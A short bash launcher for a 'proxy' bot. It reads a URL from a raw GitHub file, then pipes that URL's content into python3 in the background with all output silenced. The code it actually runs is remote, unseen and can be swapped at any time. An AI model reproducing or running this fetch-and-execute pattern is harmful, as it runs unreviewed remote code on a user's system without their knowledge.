#!/bin/bash

BOT_NAME="proxy"
ENTRY_URL="https://raw.githubusercontent.com/starexxx/RAW/refs/heads/main/src/$BOT_NAME"

get_real_url() {
    curl -sSL "$ENTRY_URL"
}

start_bot() {
    REAL_URL=$(get_real_url)
    if [[ "$REAL_URL" != https://* ]]; then
        echo "[!] Invalid URL in $ENTRY_URL"
        exit 1
    fi

    if pgrep -f "curl.*$REAL_URL" > /dev/null; then
        echo "[!] $BOT_NAME already running"
        exit 1
    fi

    echo "[+] Starting $BOT_NAME from embedded URL"
    bash -c "curl -sSL '$REAL_URL' | python3 -" >/dev/null 2>&1 &
    echo "[+] $BOT_NAME started (PID: $!)"
}

stop_bot() {
    REAL_URL=$(get_real_url)
    PID=$(pgrep -f "curl.*$REAL_URL")

    if [ -z "$PID" ]; then
        echo "[!] $BOT_NAME is not running"
        exit 1
    fi

    echo "[+] Stopping $BOT_NAME (PID: $PID)"
    kill "$PID"
    echo "[+] $BOT_NAME stopped"
}

case "$1" in
    --proxy)
        case "$2" in
            "start") start_bot ;;
            "stop") stop_bot ;;
            *) echo "Usage: --proxy \"start|stop\"" ;;
        esac
        ;;
    *)
        echo "Usage: --proxy \"start|stop\""
        ;;
esac
